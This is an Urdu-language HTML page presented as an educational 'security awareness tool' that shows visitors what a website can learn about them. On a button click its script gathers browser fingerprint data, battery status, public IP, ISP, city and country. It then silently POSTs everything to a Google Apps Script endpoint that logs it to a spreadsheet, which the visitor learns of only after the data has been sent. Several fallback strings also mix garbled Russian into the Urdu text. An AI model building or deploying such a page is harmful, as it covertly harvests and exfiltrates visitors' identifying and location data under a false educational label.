<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سیکیورٹی آگاہی ٹول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            direction: rtl;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        button {
            padding: 10px 20px;
            font-size: 18px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #result {
            margin-top: 20px;
            text-align: right;
            line-height: 1.6;
        }
        .warning {
            color: red;
            font-weight: bold;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>سیکیورٹی آگاہی ٹول</h1>
        <p class="warning">یہ ٹول آپ کو دکھاتا ہے کہ ایک ویب سائٹ آپ کے بارے میں کیا معلومات حاصل کر سکتی ہے۔ یہ صرف تعلیمی مقاصد کے لیے ہے۔</p>
        <button onclick="getBrowserInfo()">ٹیسٹ بٹن</button>
        <div id="result"></div>
    </div>

    <script>
        async function getBrowserInfo() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '<p>معلومات اکٹھی کی جا رہی ہیں...</p>';

            let info = '<h2>آپ کی معلومات:</h2>';
            let data = {};

            // براؤزر کی معلومات
            data.browser = navigator.userAgent;
            data.language = navigator.language || navigator.userLanguage;
            data.screenResolution = `${window.screen.width}x${window.screen.height}`;
            data.colorDepth = window.screen.colorDepth;
            data.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.cookiesEnabled = navigator.cookieEnabled ? 'ہاں' : 'نہیں';

            info += `<p><strong>براؤزر:</strong> ${data.browser}</p>`;
            info += `<p><strong>زبان:</strong> ${data.language}</p>`;
            info += `<p><strong>اسکرین ریزولوشن:</strong> ${data.screenResolution}</p>`;
            info += `<p><strong>کلر ڈیپتھ:</strong> ${data.colorDepth}</p>`;
            info += `<p><strong>وقت کا زون:</strong> ${data.timeZone}</p>`;
            info += `<p><strong>کوکیز فعال ہیں؟:</strong> ${data.cookiesEnabled}</p>`;

            // نیٹ ورک کی معلومات (اگر Connection API موجود ہو)
            if (navigator.connection) {
                data.networkType = navigator.connection.effectiveType;
                data.downlinkSpeed = navigator.connection.downlink;
                info += `<p><strong>نیٹ ورک کی قسم:</strong> ${data.networkType}</p>`;
                info += `<p><strong>ڈاؤن لوڈ سپیڈ:</strong> ${data.downlinkSpeed} Mbps</p>`;
            } else {
                data.networkType = "غیر доступ";
                data.downlinkSpeed = "غیر доступ";
                info += `<p><strong>نیٹ ورک کی معلومات:</strong> غیر доступ</p>`;
            }

            // IP ایڈریس اور ISP معلومات کے لیے API
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                data.ipAddress = ipData.ip;
                info += `<p><strong>IP ایڈریس:</strong> ${data.ipAddress}</p>`;

                // ISP اور دیگر معلومات کے لیے ip-api.com
                const ipInfoResponse = await fetch(`http://ip-api.com/json/${data.ipAddress}`);
                const ipInfo = await ipInfoResponse.json();
                data.isp = ipInfo.isp;
                data.city = ipInfo.city;
                data.country = ipInfo.country;
                info += `<p><strong>ISP:</strong> ${data.isp}</p>`;
                info += `<p><strong>شہر:</strong> ${data.city}</p>`;
                info += `<p><strong>ملک:</strong> ${data.country}</p>`;
            } catch (error) {
                data.ipAddress = "حاصل کرنے میں ناکامی";
                data.isp = "حاصل کرنے میں ناکامی";
                data.city = "حاصل کرنے میں ناکامی";
                data.country = "حاصل کرنے میں ناکامی";
                info += `<p><strong>IP/ISP معلومات:</strong> حاصل کرنے میں ناکامی</p>`;
            }

            // بیٹری کی معلومات
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.batteryLevel = Math.round(battery.level * 100);
                    data.batteryCharging = battery.charging ? 'ہاں' : 'نہیں';
                    info += `<p><strong>بیٹری لیول:</strong> ${data.batteryLevel}%</p>`;
                    info += `<p><strong>بیٹری چارج ہو رہی ہے؟:</strong> ${data.batteryCharging}</p>`;
                } catch (error) {
                    data.batteryLevel = "غیر доступ";
                    data.batteryCharging = "غیر доступ";
                    info += `<p><strong>بیٹری معلومات:</strong> غیر доступ</p>`;
                }
            } else {
                data.batteryLevel = "آپ کا براؤزر اس API کو سپورٹ نہیں کرتا";
                data.batteryCharging = "آپ کا براؤزر اس API کو سپورٹ نہیں کرتا";
                info += `<p><strong>بیٹری معلومات:</strong> آپ کا براؤزر اس API کو سپورٹ نہیں کرتا</p>`;
            }

            // نتائج دکھائیں
            resultDiv.innerHTML = info;

            // ڈیٹا گوگل شیٹ پر بھیجیں
            try {
                const response = await fetch('https://script.google.com/macros/s/AKfycbz1rKpaAWDsDa-HhWs6Iw6ZKKebEW-1guIekDXqZ8ODXicJzZHf-xqaSiTYdl7hWZcTxQ/exec', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                if (result.result === "success") {
                    resultDiv.innerHTML += '<p style="color: green;">معلومات کامیابی سے گوگل شیٹ پر سٹور ہو گئی!</p>';
                } else {
                    resultDiv.innerHTML += '<p style="color: red;">گوگل شیٹ پر ڈیٹا سٹور کرنے میں ناکامی: ' + result.message + '</p>';
                }
            } catch (error) {
                resultDiv.innerHTML += '<p style="color: red;">گوگل شیٹ پر ڈیٹا سٹور کرنے میں ناکامی: ' + error.message + '</p>';
            }
        }
    </script>
</body>
</html>
